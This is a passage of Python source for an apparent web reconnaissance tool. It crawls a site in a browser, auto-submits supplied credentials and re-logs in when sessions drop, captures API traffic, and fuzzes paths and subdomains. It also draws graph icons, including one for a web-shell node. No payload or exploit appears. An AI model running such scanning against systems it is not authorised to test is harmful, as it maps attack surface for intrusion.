                hit = (any(k in blob for k in self._LOGIN_TRIGGER_KEYWORDS)
                       or any(p in href for p in
                              ('/login', '/signin', '/sign-in', '/auth',
                               '/account/login', '/users/sign_in')))
                if hit:
                    self._log('Opening the login form …')
                    self.driver.execute_script('arguments[0].click();', el)
                    self._wait_ready()
                    return True
            except Exception:
                continue
        return False

    def _click_button_text(self, scope_el, keywords) -> bool:
        """Click a visible button whose text/value matches `keywords`, within the
        form containing `scope_el` (or the whole page)."""
        try:
            scope = scope_el.find_element(By.XPATH, './ancestor::form[1]')
        except Exception:
            scope = self.driver
        try:
            btns = scope.find_elements(
                By.CSS_SELECTOR, 'button, [role="button"], '
                'input[type="submit"], input[type="button"]')
        except Exception:
            btns = []
        for btn in btns:
            try:
                if not btn.is_displayed():
                    continue
                txt = (btn.text or btn.get_attribute('value') or '').strip().lower()
                if txt and any(k in txt for k in keywords):
                    self.driver.execute_script('arguments[0].click();', btn)
                    return True
            except Exception:
                continue
        return False

    def _try_identifier_first(self) -> bool:
        """Modern identifier-first login: a username/email field + a Next/Continue
        button, with the password on the NEXT screen. Fill the username and
        advance; the caller re-checks for the password field afterwards."""
        if not self.username:
            return False
        user_el = self._find_username_field(None)
        if user_el is None:
            return False
        try:
            user_el.clear()
            user_el.send_keys(self.username)
            self._accept_agreements()
            if not self._click_button_text(user_el, self._NEXT_KEYWORDS):
                user_el.send_keys(Keys.RETURN)
            self._log('Identifier-first login — entered username, advancing …')
            self._wait_ready()
            return True
        except Exception:
            return False

    def _login_succeeded(self) -> bool:
        """A still-visible password field after submit means the credentials /
        consent were rejected (or MFA/captcha is now required)."""
        return self._visible_password_field() is None

    def _try_login(self):
        """Authenticate with the supplied credentials. Handles a plain visible
        form, a login form hidden behind a 'Log in' trigger/modal (#1), and an
        identifier-first username→Next→password flow (#3). Doesn't latch on
        failure — the crawl retries on later pages and re-authenticates if the
        session drops (#2) — but is capped (_LOGIN_MAX_TRIES) to avoid lockout."""
        if self.logged_in or not (self.username or self.password):
            return False
        if self._login_tries >= self._LOGIN_MAX_TRIES:
            return False

        pwd_el = self._visible_password_field()
        # If no form is shown, try to reveal it / advance a multi-step flow — but
        # only early in the crawl, where the login lives. A deep page that bounces
        # back to a login shows the form directly (handled below).
        if pwd_el is None and len(self.visited) <= 4:
            if self._reveal_login():
                self._login_tries += 1
                pwd_el = self._visible_password_field()
            if pwd_el is None and self._try_identifier_first():
                self._login_tries += 1
                pwd_el = self._visible_password_field()
        if pwd_el is None:
            return False

        self._login_tries += 1
        user_el = self._find_username_field(pwd_el)
        try:
            if user_el is not None and self.username:
                user_el.clear()
                user_el.send_keys(self.username)
            if self.password:
                pwd_el.clear()
                pwd_el.send_keys(self.password)
            # Many panels gate the submit behind an "I agree to the terms /
            # license" checkbox — tick those first.
            self._accept_agreements()
            self._log('Login form detected — submitting credentials …')
            if not self._click_submit(pwd_el):
                pwd_el.send_keys(Keys.RETURN)
            self._wait_ready()
            if self._login_succeeded():
                self.logged_in = True
                self._login_tries = 0
                self._log('Login submitted — proceeding into authenticated area.')
                return True
            self._log('Login may have failed — password field still present '
                      '(check credentials / captcha / MFA / consent). '
                      'Will retry on later pages.')
            return False
        except Exception as e:
            self._log(f'Login attempt error: {e}')
            return False

    def _maybe_relogin(self):
        """Already logged in, but a page shows a login form again — the session
        probably dropped. Re-authenticate (credentials can; a static cookie
        can't). Capped by _LOGIN_MAX_TRIES."""
        if not (self.username or self.password):
            return
        if self._login_tries >= self._LOGIN_MAX_TRIES:
            return
        if self._visible_password_field() is not None:
            self._log('Login form reappeared — session may have dropped; '
                      're-authenticating …')
            self.logged_in = False
            self._try_login()

    def _norm(self, url):
        """Normalise a URL for dedup/visited tracking: drop a non-route fragment
        (keep SPA hash routes #/… and #!…) and strip the trailing slash."""
        p = urlparse(url)
        frag = p.fragment if p.fragment.startswith(('/', '!')) else ''
        return p._replace(fragment=frag).geturl().rstrip('/')

    def _load_entry(self, target, attempts=3):
        """Load the entry target, retrying transient connection/DNS error pages.
        Headless geckodriver flakes on dnsNotFound even when the host resolves
        fine, and one bad initial load used to abort the entire scan with a raw
        stacktrace. Retries a few times, then raises a clean, actionable error."""
        for i in range(attempts):
            if not self.running:
                return
            err = None
            try:
                self.driver.get(target)
                self._wait_ready()
            except Exception as e:
                err = str(e)
            try:
                cur = self.driver.current_url or ''
            except Exception:
                cur = ''
            if not err and not cur.startswith('about:neterror'):
                return
            self._log(f'Entry load failed (attempt {i + 1}/{attempts}): '
                      f'{target} — retrying…')
            if i < attempts - 1:
                for _ in range(10):
                    if not self.running:
                        return
                    time.sleep(0.2)
        raise RuntimeError(
            f'Could not load {target} — connection/DNS error page after '
            f'{attempts} attempts. Check the target is reachable '
            f'(e.g. try the www. host).')

    def scan(self, target: str, max_pages=None, seed_urls=None):
        """Run the full crawl against `target` (blocking; intended to run on a
        background thread).

        Loads the entry page, optionally logs in, then breadth-first crawls
        same-host links (plus any `seed_urls`); `max_pages` caps the page count
        when set, but None (the default) crawls every in-scope page found, emitting nodes
        via on_node and discovering scripts, API endpoints and sibling hosts as
        it goes. Finishes by running the active API probe and firing on_done.
        Reads self.running so stop() can interrupt it."""
        self.running = True
        self.failed = False
        self.stopped = False
        self.logged_in = False
        self._login_tries = 0
        self.visited.clear()
        self.assets.clear()
        self._probed_forms.clear()
        self.shell_hash = None
        # Requests captured on the entrance page (incl. the login request) before
        # the crawl loop reloads it and wipes the in-page network log.
        self._initial_observed = []
        self._initial_url = self._norm(target)
        domain = urlparse(target).netloc
        # Registrable domain so API/script discovery also picks up calls to
        # sibling subdomains (api.*, auth.*, cdn.*) — common on real sites.
        # Page navigation still stays on the exact entry host (set in the loop).
        self.base_domain = _registrable_domain(domain)
        self._entry_host = _host_only(domain)
        self.subs_seen.clear()

        # Fuzzing scan type: no browser crawl — just fuzz the path wordlist
        # against the host (respecting the intensity mode) and finish.
        if self.scan_type == 'fuzzing':
            try:
                self._run_fuzz(target)
            except Exception as e:
                self.failed = True
                self._log(f'Fuzzing fatal: {e}')
            finally:
                self.running = False
                self._log(f'Done. {len(self.assets)} path(s) probed.')
                if self.on_done:
                    self.on_done()
            return

        # Active subdomain enumeration (Aggressive only): pull names from
        # certificate transparency so we surface hosts the site never links to.
        # Best-effort and non-blocking to the crawl; passive collection covers
        # Stealth/Normal. Runs once, before the crawl, in its own thread.
        if (self.subdomain_discovery and self.on_subdomain
                and self.mode == 'Aggressive'):
            threading.Thread(target=self._enumerate_subdomains_crtsh,
                             daemon=True).start()

        try:
            if not SELENIUM_AVAILABLE:
                raise RuntimeError('Selenium not installed: pip install selenium')
            self._init_driver()
            self._log(f'Loading {target}')
            self._load_entry(target)

            # Auto-fill a login form with supplied credentials, if present
            self._try_login()

            # Snapshot the entrance page's live traffic now — this includes the
            # login request (POST username/password). The crawl loop reloads
            # /entrance and wipes the in-page log, so without this the login
            # request would be lost. It becomes the entrance node's data-out and
            # (as a child API node) the data-in of the node behind the login.
            try:
                self._initial_observed = self._collect_api_calls(domain)
            except Exception:
                self._initial_observed = []

            # The initial node is the page the user actually targeted, even if
            # login navigated the browser elsewhere (e.g. a security entrance
            # that redirects to a dashboard once authenticated). Seed the crawl
            # with that target first so it is node #0, then also seed wherever
            # login landed so the authenticated area is still discovered.
            domain = urlparse(target).netloc
            queue: deque = deque([(target, None)])
            landed = self.driver.current_url or target
            if (self._norm(landed) != self._norm(target)
                    and urlparse(landed).netloc == domain):
                queue.append((landed, target))
            # Extra seeds: real pages discovered for this host elsewhere (e.g.
            # <a href> links found on the primary site). Lets a sub-scan crawl a
            # host whose bare '/' is a dead end / redirect. Scoped to this host;
            # scope_pattern still applies (parent_url set → _in_scope honoured).
            for s in (seed_urls or []):
                if (self._norm(s) != self._norm(target)
                        and urlparse(s).netloc == domain):
                    queue.append((s, target))

            while (queue and self.running
                   and (max_pages is None or len(self.visited) < max_pages)):
                url, parent_url = queue.popleft()
                norm = self._norm(url)

                if norm in self.visited or urlparse(url).netloc != domain:
                    continue
                # Honour the scope filter, but never skip the seed target itself.
                if parent_url is not None and not self._in_scope(url):
                    continue

                self.visited.add(norm)
                self._log(f'[{len(self.visited)}'
                          f'{"/" + str(max_pages) if max_pages is not None else ""}'
                          f'] {url[:70]}')

                try:
                    self._throttle()
                    self.driver.get(url)
                    self._wait_ready()
                    if not self.logged_in:
                        self._try_login()
                    else:
                        self._maybe_relogin()

                    # If the browser ended on a different same-domain URL (a
                    # server or client-side redirect — e.g. a security entrance
                    # that forwards to the app once authenticated), record the
                    # requested URL as a redirect node and treat the FINAL URL
                    # as the real page beneath it. This keeps the hierarchy
                    # entrance -> landing -> rest, instead of hanging the landing
                    # page's content off the URL that merely forwarded to it.
                    final = self.driver.current_url or url
                    final_norm = self._norm(final)
                    if (final_norm != norm
                            and urlparse(final).netloc == domain
                            and final_norm not in self.visited):
                        rnode = SiteNode(url, node_type='redirect',
                                         parent_url=parent_url)
                        self._capture_http(rnode, url)
                        rnode.node_type = 'redirect'
                        rnode.links = [final]
                        # The forwarding page's own traffic (e.g. the login
                        # request the entrance page made) is its data-out.
                        if norm == self._initial_url and self._initial_observed:
                            rnode.out_requests = [
                                {'method': o['method'], 'url': o['url'],
                                 'params': o['params'], 'via': 'xhr'}
                                for o in self._initial_observed]
                        rnode.scanned = True
                        if self.on_node:
                            self.on_node(rnode)
                        if norm == self._initial_url and self._initial_observed:
                            self._discover_assets(rnode, domain,
                                                  self._initial_observed)
                        # Continue, building the real page node for the final URL
                        # as a child of the redirect node.
                        self.visited.add(final_norm)
                        parent_url = rnode.url
                        url, norm = final, final_norm

                    node = self._extract(url, parent_url)
                    self._capture_http(node, url)
                    # Authenticated scan: a page behind auth (401, or a visible
                    # login form) prompts once per host; on form login the browser
                    # is now authenticated, so re-capture to reflect it.
                    if (self.auth_scan
                            and self._maybe_prompt_auth(
                                node, url,
                                force=self._visible_password_field() is not None)):
                        self._capture_http(node, url)
                    self._mark_redirect(node)

                    # Remember the SPA/index HTML shell so we can later tell
                    # real data endpoints from catch-all route fallbacks.
                    if self.shell_hash is None and \
                            (node.content_type or '').lower().startswith('text/html'):
                        self.shell_hash = self._sig(node.resp_body)

                    found = self._collect_links(url, domain)
                    found |= self._collect_clickable_routes(domain)
                    # Simulate a user: search + click non-destructive controls so
                    # the page fires its read-style API calls (revealing params
                    # like orderBy/page/search) before we snapshot the traffic.
                    found |= self._interact(domain)
                    node.links = sorted(found)
                    node.scanned = True

                    # Requests this page actually made (real XHR/fetch incl.
                    # POST bodies) become its "data out" — the requests it can
                    # use. Collected generically from the fetch/XHR instrumentation.
                    observed = self._collect_api_calls(domain)
                    # Restore the entrance page's pre-crawl traffic (incl. the
                    # login request), wiped when the loop reloaded this page.
                    if norm == self._initial_url and self._initial_observed:
                        have = {(o['method'], o['url']) for o in observed}
                        observed = self._initial_observed + [
                            o for o in observed
                            if (o['method'], o['url']) not in have]
                    node.out_requests = [
                        {'method': o['method'], 'url': o['url'],
                         'params': o['params'], 'via': 'xhr'}
                        for o in observed]

                    if self.on_node:
                        self.on_node(node)
                    for link in node.links:
                        if self._norm(link) not in self.visited:
                            queue.append((link, url))

                    # Discover JS bundles & API endpoints for this page
                    self._discover_assets(node, domain, observed)
                except Exception as e:
                    self._log(f'Error: {url[:50]} -> {e}')

            # Active API-endpoint discovery, once per host after the crawl (the
            # SPA shell signature is known by now, so catch-all 200s are dropped).
            # Normal: high-signal spec/well-known probes; Aggressive: + wordlist
            # fuzzing. Skipped in Stealth (low-noise by design). (Pure fuzzing
            # runs via _run_fuzz instead, without the browser crawl.)
            if self.running and self.mode != 'Stealth':
                try:
                    self._probe_api_endpoints(domain, target)
                except Exception as e:
                    self._log(f'API probe error: {e}')

        except Exception as e:
            self.failed = True
            msg = str(e)
            if 'neterror' in msg or 'Reached error page' in msg:
                self._log('Scan failed: could not connect to the target '
                          '(DNS/connection error). Verify the URL is reachable.')
            else:
                self._log(f'Scanner fatal: {e}')
        finally:
            self.running = False
            if self.driver:
                # Capture browser geometry before killing it so the next run
                # can restore the same size/position.
                try:
                    pos = self.driver.get_window_position()
                    sz  = self.driver.get_window_size()
                    self.last_browser_rect = (
                        f"{sz['width']}x{sz['height']}+{pos['x']}+{pos['y']}")
                except Exception:
                    pass
                try:
                    self.driver.quit()
                except Exception:
                    pass
            self._log(f'Done. {len(self.visited)} pages scanned.')
            if self.on_done:
                self.on_done()

    def _run_fuzz(self, target):
        """Fuzzing scan type: no browser. Establish an entrance node for `target`
        then run the path-wordlist fuzzing pass under the host, emitting every
        hit. Uses requests directly (no Selenium) and is paced by the intensity
        mode's throttle. The whitelist does not apply (GET path discovery only)."""
        if not REQUESTS_AVAILABLE:
            self._log('Fuzzing needs requests: pip install requests')
            return
        domain = urlparse(target).netloc
        self._log(f'Fuzzing {target} ({self.mode} mode, no browser)')
        # Entrance node so discovered paths hang off the target as children.
        # Marked anchor-only: if the graph already holds this URL (e.g. from a
        # prior Browser crawl), the app keeps the richer existing node rather
        # than overwriting it with this bare requests-only fetch.
        root = SiteNode(target, node_type='page', parent_url=None)
        root._anchor_only = True
        self._throttle()
        self._capture_http(root, target)
        if self._maybe_prompt_auth(root, target):
            self._capture_http(root, target)
        root.scanned = True
        self.assets.add(self._norm(target))   # don't re-probe the entrance
        if self.on_node:
            self.on_node(root)
        # Path-wordlist + well-known fuzzing under the host root.
        if self.running:
            self._probe_api_endpoints(domain, target)

    def stop(self):
        """Request the crawl to stop: clears the running flag (the loop checks
        it) and marks the run as user-stopped."""
        self.running = False
        self.stopped = True


# ─────────────────────────────────────────────
# Node icons (drawn as matplotlib vector shapes)
# ─────────────────────────────────────────────
def _gear_verts(cx, cy, r_out, r_in, teeth=8):
    """Vertices of a gear/cog outline centred at (cx, cy), alternating between
    the outer and inner radius to form `teeth` teeth."""
    pts = []
    for i in range(teeth * 2):
        ang = math.pi * i / teeth
        r = r_out if i % 2 == 0 else r_in
        pts.append((cx + r * math.cos(ang), cy + r * math.sin(ang)))
    return pts


def _icon_gear(ax, cx, cy, r, z, face='#808080'):
    """Chicago-95 gear icon: a toothed silver cog with a black outline and a
    hollow hub."""
    ax.add_patch(mpatches.Polygon(_gear_verts(cx, cy, r, r * 0.70, 8),
                 closed=True, facecolor=face, edgecolor='#000000',
                 linewidth=1.0, zorder=z))
    # Highlight ring + hollow hub for a bit of Win95 bevel.
    ax.add_patch(mpatches.Circle((cx, cy), r * 0.50, facecolor='#c0c0c0',
                 edgecolor='#000000', linewidth=0.6, zorder=z + 0.1))
    ax.add_patch(mpatches.Circle((cx, cy), r * 0.24, facecolor='#ffffff',
                 edgecolor='#000000', linewidth=0.6, zorder=z + 0.2))


def _icon_doc(ax, x, y, s, face, z, lines=3, line_color='#1f63d3', text=''):
    """Chicago-95 document icon: a page with a folded top-right corner and a
    thin black outline. Shows either horizontal text lines (`line_color`) or a
    centred bold label (`text`, e.g. a script's extension)."""
    w, h = s * 1.45, s * 1.95
    left, bottom = x - w / 2, y - h / 2
    fold = s * 0.55
    # Page body.
    ax.add_patch(mpatches.Polygon([
        (left, bottom), (left, bottom + h),
        (left + w - fold, bottom + h), (left + w, bottom + h - fold),
        (left + w, bottom)],
        closed=True, facecolor=face, edgecolor='#000000', linewidth=1.0, zorder=z))
    # Folded top-right corner (lighter, with its own outline).
    ax.add_patch(mpatches.Polygon([
        (left + w - fold, bottom + h),
        (left + w - fold, bottom + h - fold),
        (left + w, bottom + h - fold)],
        closed=True, facecolor='#d0d0d0', edgecolor='#000000',
        linewidth=0.7, zorder=z + 0.1))
    top = bottom + h - fold
    if text:
        # Size the label with the icon (s), so it stays legible in the large
        # rasterized sprite instead of a fixed tiny point size.
        ax.text(x, y, text, ha='center', va='center',
                zorder=z + 0.3, fontsize=max(4.0, s * 40.0), fontweight='bold',
                color=line_color, family='monospace')
    else:
        for i in range(lines):
            ly = top - (i + 1) * (h * 0.18)
            ax.plot([left + w * 0.18, left + w * 0.80], [ly, ly],
                    color=line_color, linewidth=max(1.0, s * 7.0), zorder=z + 0.2)


def _icon_folder(ax, x, y, s, face, z):
    """Draw a folder glyph of size `s` at (x, y) on Matplotlib axes `ax`."""
    w, h = s * 1.9, s * 1.4
    left, bottom = x - w / 2, y - h / 2
    tabw, tabh = w * 0.42, h * 0.24
    ax.add_patch(mpatches.Polygon([
        (left, bottom + h), (left, bottom + h + tabh),
        (left + tabw, bottom + h + tabh), (left + tabw + tabh, bottom + h)],
        closed=True, facecolor=face, edgecolor='#202020', linewidth=0.8, zorder=z))
    ax.add_patch(mpatches.Rectangle((left, bottom), w, h, facecolor=face,
                 edgecolor='#202020', linewidth=1.0, zorder=z + 0.1))
    ax.add_patch(mpatches.Rectangle((left, bottom + h * 0.62), w, h * 0.1,
                 facecolor='#ffffff', edgecolor='none', alpha=0.5, zorder=z + 0.2))


def _icon_script(ax, x, y, s, face, z, text=''):
    """Script node: a Chicago-95 document icon tinted orange (the script type
    colour) and labelled with the language extension (.js, .php …)."""
    _icon_doc(ax, x, y, s, face, z, lines=2,
              line_color='#202020', text=text or '</>')


def _icon_api(ax, x, y, s, face, z):
    """API endpoint: a Chicago-95 gear icon."""
    _icon_gear(ax, x, y, s * 0.95, z)


def _win95_window(ax, x, y, s, face, z):
    """Draw a Chicago / Windows-95 style window — a raised silver frame with a
    coloured title bar carrying minimize / maximize / close buttons — and return
    the white client area as (left, bottom, w, h) for the caller to fill. The
    title bar takes the node's type colour (`face`)."""
    w, h = s * 1.95, s * 1.65
    left, bottom = x - w / 2, y - h / 2
    # Raised silver frame with a 3D bevel (white top-left, grey bottom-right).
    ax.add_patch(mpatches.Rectangle((left, bottom), w, h, facecolor='#c0c0c0',
                 edgecolor='#000000', linewidth=1.0, zorder=z))
    ax.plot([left, left, left + w], [bottom, bottom + h, bottom + h],
            color='#ffffff', linewidth=1.0, zorder=z + 0.05)
    ax.plot([left, left + w, left + w], [bottom, bottom, bottom + h],
            color='#808080', linewidth=1.0, zorder=z + 0.05)

    b = s * 0.14
    inner_left, inner_right = left + b, left + w - b
    inner_w   = w - 2 * b
    inner_top = bottom + h - b
    bar_h     = h * 0.28
    bar_bottom = inner_top - bar_h
    # Title bar in the type colour.
    ax.add_patch(mpatches.Rectangle((inner_left, bar_bottom), inner_w, bar_h,
                 facecolor=face, edgecolor='#000000', linewidth=0.5, zorder=z + 0.1))
    bar_cy = bar_bottom + bar_h / 2
    # Minimize / maximize / close buttons (silver squares with glyphs), right.
    bs, gap = bar_h * 0.66, s * 0.05
    by = bar_cy - bs / 2
    bx = inner_right - s * 0.05 - bs
    for g in ('close', 'max', 'min'):
        ax.add_patch(mpatches.Rectangle((bx, by), bs, bs, facecolor='#c0c0c0',
                     edgecolor='#000000', linewidth=0.4, zorder=z + 0.25))
        gcx, gcy = bx + bs / 2, by + bs / 2
        if g == 'close':
            d = bs * 0.26
            ax.plot([gcx - d, gcx + d], [gcy - d, gcy + d],
                    color='#000000', linewidth=0.6, zorder=z + 0.4)
            ax.plot([gcx - d, gcx + d], [gcy + d, gcy - d],
                    color='#000000', linewidth=0.6, zorder=z + 0.4)
        elif g == 'min':
            ax.plot([gcx - bs * 0.26, gcx + bs * 0.26],
                    [by + bs * 0.22, by + bs * 0.22],
                    color='#000000', linewidth=0.7, zorder=z + 0.4)
        else:
            ax.add_patch(mpatches.Rectangle((gcx - bs * 0.26, gcy - bs * 0.24),
                         bs * 0.52, bs * 0.48, fill=False, edgecolor='#000000',
                         linewidth=0.5, zorder=z + 0.4))
        bx -= (bs + gap)
    # White client area below the title bar.
    cl, cb = inner_left, bottom + b
    cw, ch = inner_w, bar_bottom - cb - s * 0.04
    if ch > 0:
        ax.add_patch(mpatches.Rectangle((cl, cb), cw, ch, facecolor='#ffffff',
                     edgecolor='#808080', linewidth=0.5, zorder=z + 0.1))
    return cl, cb, cw, ch


def _icon_window(ax, x, y, s, face, z, text=''):
    """Webpage node: a Chicago-95 window. Shows the page's file extension
    (html, php, …) in the client area when known, else a couple of text lines."""
    cl, cb, cw, ch = _win95_window(ax, x, y, s, face, z)
    if ch <= 0:
        return
    if text:
        ax.text(cl + cw / 2, cb + ch / 2, text, ha='center', va='center',
                zorder=z + 0.3, fontsize=7, fontweight='bold',
                color='#202020', family='monospace')
    else:
        for i in range(2):
            ly = cb + ch * (0.68 - i * 0.34)
            ax.plot([cl + cw * 0.12, cl + cw * 0.88], [ly, ly],
                    color='#888888', linewidth=max(1.0, s * 7.0), zorder=z + 0.2)


def _icon_redirect_window(ax, x, y, s, face, z):
    """Redirect node: a Chicago-95 window (red title bar via `face`) with a red
    arrow across the client area."""
    cl, cb, cw, ch = _win95_window(ax, x, y, s, face, z)
    if ch <= 0:
        return
    RED = '#b71c1c'
    ay = cb + ch * 0.5
    xl, xr = cl + cw * 0.14, cl + cw * 0.86
    head_w, head_h = cw * 0.26, ch * 0.62
    # Shaft thickness scales with the icon (s) so it isn't a hairline in the
    # large rasterized sprite.
    ax.plot([xl, xr - head_w * 0.55], [ay, ay], color=RED,
            linewidth=max(1.6, s * 18.0), zorder=z + 0.4, solid_capstyle='butt')
    ax.add_patch(mpatches.Polygon(
        [(xr, ay), (xr - head_w, ay + head_h / 2), (xr - head_w, ay - head_h / 2)],
        closed=True, facecolor=RED, edgecolor=RED, zorder=z + 0.5))


def _icon_file_blank(ax, x, y, s, _face, z):
    """File node: a Chicago-95 document icon — a white page with a folded
    top-right corner and blue text lines (ignores the gold type swatch)."""
    _icon_doc(ax, x, y, s, '#ffffff', z, lines=3, line_color='#1f63d3')


def _icon_shell(ax, x, y, s, face, z):
    """Shell node: a Chicago-95 window like a page, but the client area is a
    black terminal — a green '>' prompt line, a cyan "server response" line in
    the middle, and a green line below — the look of an interactive web shell."""
    cl, cb, cw, ch = _win95_window(ax, x, y, s, face, z)
    if ch <= 0:
        return
    # Bright terminal green-on-black (exempt from the app-wide green
    # unification) so the icon's prompt reads like the real Web Shell terminal.
    GREEN = '#00ff00'
    CYAN  = '#00ffff'
    # Black terminal screen filling the client area.
    ax.add_patch(mpatches.Rectangle((cl, cb), cw, ch, facecolor='#000000',
                 edgecolor='#000000', linewidth=0.5, zorder=z + 0.15))
    # Output lines; the top line is a short '>' prompt with a blinking-style
    # caret, the rest are full-width "command output" lines. The middle line is
    # cyan to echo the cyan server-response colour in the Web Shell terminal.
    rows = 3
    lw = max(1.0, s * 6.0)
    for i in range(rows):
        ly = cb + ch * (0.74 - i * 0.24)
        if i == 0:
            # Prompt caret: a short bar at the far left.
            ax.plot([cl + cw * 0.10, cl + cw * 0.16], [ly, ly],
                    color=GREEN, linewidth=lw, zorder=z + 0.25)
            ax.plot([cl + cw * 0.20, cl + cw * 0.62], [ly, ly],
                    color=GREEN, linewidth=lw, zorder=z + 0.25)
        else:
            ax.plot([cl + cw * 0.10, cl + cw * (0.90 - 0.12 * i)], [ly, ly],
                    color=(CYAN if i == 1 else GREEN), linewidth=lw,
                    zorder=z + 0.25)


def _draw_node_icon(ax, ntype, x, y, s, face, z=3, text=''):
    """Draw the icon matching a node's type (`ntype`) at (x, y) on `ax`,
    dispatching to the per-type glyph helper."""
    if ntype == 'redirect':
        _icon_redirect_window(ax, x, y, s, face, z)
    elif ntype == 'script':
        _icon_script(ax, x, y, s, face, z, text)
    elif ntype in ('api', 'endpoint'):
        _icon_api(ax, x, y, s, face, z)
    elif ntype == 'file':
        _icon_file_blank(ax, x, y, s, face, z)
    elif ntype == 'shell':
        _icon_shell(ax, x, y, s, face, z)
    else:
        _icon_window(ax, x, y, s, face, z, text)


# ── Node-icon sprites (saved PNG assets) ──────────────────────────────
# Drawing each node as ~8 vector patches is the dominant cost of a detailed
# render (≈2.9s for 400 nodes). Each icon type is instead rasterized ONCE to a
# PNG saved next to the script (reconner-icons/, same convention as the app
# icon) and blitted per node (one artist each), cutting the detailed render ~4×.
# The app ONLY loads these PNGs — it never rasterizes an icon at runtime. The
# files are produced as a build step (`python reconner.py --gen-icons`) and
# shipped/installed; if one is missing the node falls back to a plain dot.
# Sprites are scaled to data units at draw time so they still grow/shrink with
# the zoom (no size "pop").
_NODE_ICON_TYPES   = ('page', 'file', 'redirect', 'script', 'api', 'shell')
_ICON_SPRITE_PX    = 256
_ICON_SPRITE_AXIS  = 1.3
_ICON_SPRITE_SCALE = 1.0
_ICON_TYPE_COLORS  = {}
# ntype -> (RGBA float array, opaque footprint in px) or None. The footprint is
# the icon's real drawn size, so the renderer can scale a sprite to exactly the
# data size the vector icon would have occupied — self-calibrating, no magic K.
_ICON_SPRITES: dict = {}

# User-selectable graph-icon resolution (Settings ▸ Interface). The master PNG is
# 256px; Medium/Low downsample it so icons render blurrier but lighter/faster.
# Only affects the graph's node icons. 'High' uses the master untouched.
_ICON_RES_PX = {'High': 256, 'Medium': 128, 'Low': 64}
_ICON_RESOLUTION = 'Low'


def set_icon_resolution(level):
    """Set the graph node-icon resolution ('High'/'Medium'/'Low') and drop the
    sprite cache so the next render reloads icons at the new resolution."""
    global _ICON_RESOLUTION
    level = level if level in _ICON_RES_PX else 'Low'
    if level != _ICON_RESOLUTION:
        _ICON_RESOLUTION = level
        _ICON_SPRITES.clear()


def _resample_rgba(arr, px):
    """Resize a float RGBA array (HxWx4, values 0..1) to px×px. Prefers Pillow's
    LANCZOS (clean), falling back to nearest-neighbour via numpy indexing."""
    h, w = arr.shape[0], arr.shape[1]
    if px == w and px == h:
        return arr
    try:
        from PIL import Image
        im = Image.fromarray((np.clip(arr, 0, 1) * 255).astype('uint8'), 'RGBA')
        im = im.resize((px, px), Image.LANCZOS)
        return np.asarray(im).astype(float) / 255.0
    except Exception:
        ys = np.linspace(0, h - 1, px).astype(int)
        xs = np.linspace(0, w - 1, px).astype(int)
        return arr[ys][:, xs]


def _node_icon_dir():
    """Directory holding the saved node-icon PNGs, next to this script (so it
    works from source and once installed) — mirrors the app icon's lookup."""
    try:
        here = os.path.dirname(os.path.abspath(__file__))
    except Exception:
        here = os.getcwd()
    return os.path.join(here, 'reconner-icons')


def _node_icon_file(ntype):
    """Filesystem path of the cached PNG sprite for node type `ntype`."""
    return os.path.join(_node_icon_dir(), f'{ntype}.png')


def _node_icon_color(ntype):
    """The legend/swatch colour for node type `ntype` (cached), defaulting to
    the page colour for unknown types."""
    if not _ICON_TYPE_COLORS:
        _ICON_TYPE_COLORS.update({
            'page': C['node_page'], 'file': C['node_file'],
            'redirect': C['node_redirect'], 'script': C['node_script'],
            'endpoint': C['node_api'], 'shell': C['node_shell']})
    return _ICON_TYPE_COLORS.get(ntype, C['node_page'])


def _render_node_icon_png(ntype, px=_ICON_SPRITE_PX):
    """Render one node-icon type to transparent PNG bytes (same technique as the
    app icon). Used by generate_node_icons() to produce the saved assets."""
    fig = plt.figure(figsize=(px / 100.0, px / 100.0), dpi=100)
    ax = fig.add_axes([0, 0, 1, 1])
    ax.set_xlim(-_ICON_SPRITE_AXIS, _ICON_SPRITE_AXIS)
    ax.set_ylim(-_ICON_SPRITE_AXIS, _ICON_SPRITE_AXIS)
    ax.set_aspect('equal')
    ax.axis('off')
    _draw_node_icon(ax, ntype, 0.0, 0.0, _ICON_SPRITE_SCALE,
                    _node_icon_color(ntype), z=3)
    import io
    buf = io.BytesIO()
    fig.savefig(buf, format='png', transparent=True, dpi=100)
    plt.close(fig)
    return buf.getvalue()


def generate_node_icons(force=False):
    """Write the node-icon PNGs to reconner-icons/ next to the script. Run once
    as a build step (or `python reconner.py --gen-icons`); the app then just
    loads these files. Returns the list of paths written."""
    if not MPL_AVAILABLE:
        return []
    try:
        os.makedirs(_node_icon_dir(), exist_ok=True)
    except Exception:
        return []
    written = []
    for nt in _NODE_ICON_TYPES:
        path = _node_icon_file(nt)
        if not force and os.path.isfile(path):
            continue
        try:
            with open(path, 'wb') as f:
                f.write(_render_node_icon_png(nt))
            written.append(path)
        except Exception:
            pass
    return written


def _icon_sprite(ntype):
    """(RGBA array, opaque px) for a node-icon type, loaded from its saved PNG in
    reconner-icons/ and cached. The app only ever LOADS these files — it never
    rasterizes an icon at runtime. Returns None if matplotlib is unavailable or
    the PNG is missing/unreadable (run `python reconner.py --gen-icons` to
    (re)create them); the caller then shows a plain coloured dot."""
    # 'endpoint' nodes reuse the 'api' sprite (renamed label, same glyph), so the
    # icon asset doesn't have to be regenerated/renamed.
    if ntype == 'endpoint':
        ntype = 'api'
    key = ntype if ntype in _NODE_ICON_TYPES else 'page'
    if key in _ICON_SPRITES:
        return _ICON_SPRITES[key]
    if not MPL_AVAILABLE:
        return None
    path = _node_icon_file(key)
    result = None
    try:
        arr = plt.imread(path)
        # Downsample the master per the chosen resolution (High = untouched).
        arr = _resample_rgba(arr, _ICON_RES_PX.get(_ICON_RESOLUTION, 256))
        if arr.ndim == 3 and arr.shape[2] == 4:
            opaque = arr[:, :, 3] > 0.1
        else:
            opaque = np.ones(arr.shape[:2], dtype=bool)
        rows = np.where(np.any(opaque, axis=1))[0]
        cols = np.where(np.any(opaque, axis=0))[0]
        native_px = (float(max(rows[-1] - rows[0] + 1, cols[-1] - cols[0] + 1))
                     if rows.size and cols.size else float(arr.shape[0]))
        result = (arr, native_px)
    except Exception:
        result = None
    _ICON_SPRITES[key] = result
    return result


def _icon_pencil(ax, x, y, s, z):
    """Diagonal pencil drawn over the top-right of a node icon to mark it as
    user-edited. The eraser sits at the outer top-right corner; the tip points
    down and to the left, into the icon — i.e. the pencil straddles the icon's
    top-right corner."""
    tx, ty = x + s * 0.30, y + s * 0.30
    ex, ey = x + s * 1.15, y + s * 1.15
    dx, dy = tx - ex, ty - ey
    L = math.hypot(dx, dy)
    if L < 1e-9:
        return
    ux, uy = dx / L, dy / L
    perpx, perpy = -uy, ux
    hw = s * 0.12

    L_tip = s * 0.20
